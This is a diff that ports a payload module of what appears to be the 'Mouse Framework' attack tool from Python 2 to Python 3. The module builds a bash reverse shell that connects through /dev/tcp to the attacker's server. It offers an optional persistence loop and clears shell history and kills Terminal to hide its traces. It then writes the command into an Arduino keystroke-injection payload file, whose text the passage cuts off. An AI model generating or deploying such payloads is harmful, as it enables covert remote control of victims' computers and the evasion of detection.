@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 #            ---------------------------------------------------
 #                              Mouse Framework                                 
@@ -18,7 +18,7 @@
 #        You should have received a copy of the GNU General Public License
 #        along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
-from core import helper as h
+import core.helper as h
 import os, time
 
 class payload:
@@ -29,10 +29,10 @@ class payload:
 
 	def run(self,server):
 		while 1:
-			shell = raw_input(h.info_general_raw("Target shell: ")).strip(" ")
+			shell = input(h.info_general_raw("Target shell: ")).strip(" ")
 			while shell == "":
-			    shell = raw_input(h.info_general_raw("Target shell: ")).strip(" ")
-			persistence = raw_input(h.info_question_raw("Make persistent? (y/n): ")).strip(" ").lower()
+				shell = input(h.info_general_raw("Target shell: ")).strip(" ")
+			persistence = input(h.info_question_raw("Make persistent? (y/n): ")).strip(" ").lower()
 			if persistence == "y":
 				shell_command = "while true; do $("+shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done & "
 				break
@@ -40,33 +40,33 @@ class payload:
 				shell_command = shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
 				break
 		shell_command += "history -wc;killall Terminal"
-		path = raw_input(h.info_general_raw("Output path: ")).strip(" ")
+		path = input(h.info_general_raw("Output path: ")).strip(" ")
 		if path == "":
-		    path = "payload.ino"
+			path = "payload.ino"
 		if os.path.isdir(path):
-		    if os.path.exists(path):
-			if path[-1] == "/":
-                             payload_save_path = path + "payload.ino"
-                        else:
-                             payload_save_path = path + "/payload.ino"
-		    else:
-			h.info_error("Local directory: "+path+": does not exist!")
-			exit
+			if os.path.exists(path):
+				if path[-1] == "/":
+					payload_save_path = path + "payload.ino"
+				else:
+					payload_save_path = path + "/payload.ino"
+			else:
+				h.info_error("Local directory: "+path+": does not exist!")
+				exit
 		else:
-		    direct = os.path.split(path)[0]
-		    if direct == "":
-			direct = "."
-		    else:
-			pass
-		    if os.path.exists(direct):
-		        if os.path.isdir(direct):
-		            payload_save_path = path
-		        else:
-			    h.info_error("Error: "+direct+": not a directory!")
-			    exit
-		    else:
-		        h.info_error("Local directory: "+direct+": does not exist!")
-		        exit
+			direct = os.path.split(path)[0]
+			if direct == "":
+				direct = "."
+			else:
+				pass
+			if os.path.exists(direct):
+				if os.path.isdir(direct):
+					payload_save_path = path
+				else:
+					h.info_error("Error: "+direct+": not a directory!")
+					exit
+			else:
+				h.info_error("Local directory: "+direct+": does not exist!")
+				exit
 			
 		payload = """\
 #include "Keyboard.h"
